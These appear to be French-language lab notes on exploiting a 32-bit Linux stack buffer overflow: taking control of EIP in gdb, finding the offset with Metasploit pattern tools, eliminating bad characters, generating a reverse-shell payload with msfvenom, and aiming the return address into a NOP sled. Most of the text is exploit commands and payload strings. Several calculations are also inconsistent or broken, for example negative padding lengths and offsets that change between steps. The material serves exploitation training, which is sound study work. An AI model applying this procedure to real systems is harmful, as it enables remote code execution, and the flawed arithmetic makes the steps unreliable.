**Take Controle of EIP**

Avec `gdb`, envoyer un nombre important de 'A' au programme jusqu'a obtenir une erreur soit (`SIGSEGV, Segementation fault`)

```sh
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) run $(python2 -c "print 'A' * 1200")
```

A partir des informations du registre `info registers`, verifier que nous avons bien ecrit sur `EIP` et qu'il a les valeurs `A` soit `0x41414141`

---

**Finding the offset**

Maintenant il faut chercher le `offset` c'est la taille exact qu'il faut pour écrasé sur `EIP`

```sh
msf-pattern_create -l 100
```

Executer la sortie de la commande dans `gdb` 

```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
```

Verifier que `EIP` a une nouvelle valeur, prendre cette valeur et trouver l'`offset` correspondant.

```sh
msf-pattern_offset -q {EIP_VALUE}
```

Ceci vas retourner une valeur qui sera la taille de note `offset`.

---

**Determine the Length for Shellcode**

Apres avoir trouver l'`offset` , nous devons maintenant découvrir de combien d’espace nous disposons pour que notre reverse shell

nous avons besoin de :

```sh
   Buffer = "A" * (offset - 100 - 150 - 4)
     NOPs = "\x90" * 4
Shellcode = "\x44" * 50
      EIP = "\x66" * 4
```

```sh
(gdb) run $(python2 -c 'print "A" * (54 - 100 - 150 - 4) + "\x90" * 4 + "B" * 50 + "\x66" * 4')
```

Verifier que nous controllons `EIP` et qu'il a une nouvelle valeur soit `0x66666666`.

---

**Find bad caracter**

Une fois que nous controllons l'`EIP`, nous devons identifier les mauvais caractères

Nous utilisons cette liste de caractères  pour connaître tous les caractères que nous devons prendre en compte et éviter lors de la génération de notre shellcode.

Cette chaîne fait `256`  octets

```sh
$CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

echo $CHARS | sed 's/\\x/ /g' | wc -w
```

Nous devons donc recalculer notre tampons

```sh
Buffer = "A" * (offset - 256 - 4)
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Maintenant il faut mettre un point d'arrêt au niveau de la fonction vulnerable pour que l'exécution s'arrête à ce stade, et nous puissions analyser le contenu de la mémoire.

```sh
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

Maintenant, nous pouvons exécuter l’entrée nouvellement créée et consulter la mémoire.

```sh
(gdb) run $(python2 -c 'print "A" * (54 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```

Après avoir exécuté notre tampon avec les mauvais caractères et atteint le point d'arrêt, nous pouvons examiner la pile.

```sh
(gdb) x/2000xb $esp+500
```

> Descendre plus bas et chercher le point final de `A` et le point de départ de `CHARS`

Nous voyons où se termine notre `A` et où commence la variable `CHARS`

> Noter tout les caractères qui saute l'ordre de `CHARS`, supprimer le de `CHARS` et ajuster le numéro de `CHARS` en retirant `-1` soit : `Buffer = "A" * (offset - (256 - n) - 4)` puis **rexécuter**

**Ce processus doit être répété jusqu'à ce que tous les caractères susceptibles d'interrompre le flux soient supprimés.**

> [!NOTE] Generalement nous devont verifier le `\x00` qui nous indique que ce caractère n'est pas autorisé ici et doit être supprimé en conséquence.


Ces caractères noter sera notre `bad characters`

---

**Generating Shellcode**

```sh
msfvenom --platform linux -a x86 -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 -f c -b "<badchars>" -o shellcode.c
```

Maintenant que nous avons notre shellcode, nous l'ajustons pour n'avoir qu'une seule chaîne, puis nous pouvons adapter et soumettre à nouveau notre simple exploit.

```sh
   Buffer = "A" * (offset - 124 - 95 - 4)
     NOPs = "\x90" * 4
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4
```

```sh
(gdb) run $(python -c 'print "\x55" * (offset - 124 - 95 - 4) + "\x90" * 4 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

Ensuite, nous vérifions si les premiers octets de notre shellcode correspondent aux octets après le NOPS.

Aller a la fin des `NOPs` et obsever le debut du shellcode

```sh
(gdb) x/2000xb $esp+550
```

---

**Identification of the Return Address**

Après avoir vérifié que nous contrôlons toujours l'EIP avec notre shellcode, nous avons maintenant besoin d'une adresse mémoire où se trouvent nos NOP pour dire à l'EIP d'y accéder.

Cette adresse mémoire ne doit contenir aucun des mauvais caractères que nous avons trouvés précédemment.

```sh
(gdb) x/2000xb $esp+1400
# 0xffffd644: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd64c: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd654: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd65c: 0x90  0x90  0xda  0xca  0xba  0xe4  0x11  0xd4
```

Ici, il faut maintenant choisir une adresse à laquelle on se réfère `EIP`

Après avoir sélectionné une adresse mémoire, nous remplaçons notre " `\x66`" qui écrase l'EIP pour lui dire de passer à l'adresse selectionner. (`0xffffd64c`)

Notez que la saisie de l'adresse selectionner est saisie à l'envers.
 
```sh
   Buffer = "A" * (offset - 100 - 95 - 4)
     NOPs = "\x90" * 4
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = \x4c\xd6\xff\xff"
```

> **Executer le programme pour obtenir un reverse shell**

```sh
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

